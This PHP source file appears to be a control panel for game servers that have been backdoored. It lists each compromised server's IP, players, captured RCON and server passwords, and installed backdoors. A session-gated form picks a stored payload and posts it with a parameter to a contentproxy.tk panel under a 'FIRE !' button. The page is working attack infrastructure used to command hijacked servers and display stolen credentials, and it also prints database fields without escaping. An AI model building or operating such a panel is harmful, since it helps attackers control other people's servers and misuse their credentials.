<?php
session_start();
$id = $_GET["id"];
		$db = new PDO("mysql:host=localhost:3306;dbname=dbname", "username", "password");
$q = "SELECT * FROM `servers` WHERE id=:id";
$r = $db->prepare($q);
$r->bindParam(":id", $id);
$r->execute();
$key = $r->fetch();
$name = $key["name"];
$ip = $key["ip"];
$player = $key["player"];
$maxplayer = $key["maxplayer"];
$gamemode = $key["gamemode"];
$uptime = $key["uptime"];
$lastping = $key["lastping"];
$status = $key["status"];

$players = nl2br(base64_decode($key["players"]));
?>

<!DOCTYPE html>
<html>
<head>
	<title>RT Server</title>
	<meta property="og:title" content="<?php echo "$name - $ip $player/$maxplayer"; ?>" />
	<style type="text/css">
		*{
			font-family: arial;
		}
		.title{
			font-size: 32px;
			margin-left: 15%;
		}
		.body{
			width: 75%;
			height: 1000px;
			text-align: left;
			background-color: #eaeaea;
		}
		p{
			margin-left: 15px;
		}
		.c{
			color: green;
		}
		.e{
			color: red;
		}
		.d{
			color: orange;
		}
		.b{
			color: #0f6bff;
		}
		.lesbackdoors{
			position: absolute;
			top: 25%;
			left: 50%;
		}
	</style>
</head>
<body>
	<center>
		<div class="body">
			<h1 class="title"><?php echo $name; ?></h1>
			<a href="http://contentproxy.tk/panel">Go back to panel</a>
			<p>
			 		<strong>Gamemode:</strong> <?php echo $key["gamemode"]; ?><br />
			 		<?php
			$rcon = $key["rcon"];
			if($rcon == "NOT FOUND")
			{
			}else{
				if(isset($_SESSION["pw"]) && ($_SESSION["pw"] == "ok"))
					echo "<strong>Rcon Password:</strong> $rcon<br />";
			}
			?>
			 		<?php
			$fdl = $key["fastdlurl"];
			if($rcon == "NOT FOUND")
			{
			}else{
				echo "<strong>FastDL URL:</strong> $fdl<br />";
			}
			?>

			 		<strong>Server Uptime(Minutes):</strong> <?php echo $key["uptime"]; ?><br />
			 		<strong>IP Address:</strong> <?php echo $ip; ?><br />
			 		<strong>Last call:</strong> <?php echo $key["lastping"]; ?><br />
			 		<strong>Password:</strong> <?php echo $key["password"]; ?><br />
			 		<strong>Players: </strong>
			 		<div>
			 		<?php
			 		$players = $key["players"];
			 		if($players != "")
			 		{
			 			$players = base64_decode($players);
			 			echo nl2br($players);
			 		}?></div><br /><?php
			 		if(!empty($key["password"]))
			 		{
			 		?><br />
			 		
			 		
			 		<?php } ?>
			 	</p>
			 	<?php
			 	if(isset($_SESSION["pw"]) && ($_SESSION["pw"] == "ok"))
			 		{ ?>
					<form method="POST" action="http://contentproxy.tk/panel">
			 			<input type="hidden" name="id" value="<?php echo $key["id"]; ?>">
			 			Payload: <select name="name"  class="form-control">
			 				<?php
			 				foreach ( $db->query("SELECT * FROM `payloads`") as $a) {
			 					?> <option value="<?php echo $a["name"]; ?>"><?php echo $a["name"]; ?></option> <?php
			 				}
			 				?>
			 			</select>
			 			<br />
			 			Parameter: <input type="text" name="param" class="form-control"> 
			 			<br />
			 			<input type="submit" name="sbbp" class="btn btn-light" value="FIRE !">
			 		</form>
			 		

			 		<div class="lesbackdoors">
			 		<strong>Backdoors:</strong> <?php
			 		$bd = $key["backdoors"];
			 		$bd = htmlentities($bd);
			 		$bd = nl2br($bd);
			 		?>
			 		<div>
			 			<?php echo $bd; ?>
			 		</div>
			 		</div>
			 		<?php } ?>
		</div>
	</center>
</body>
</html>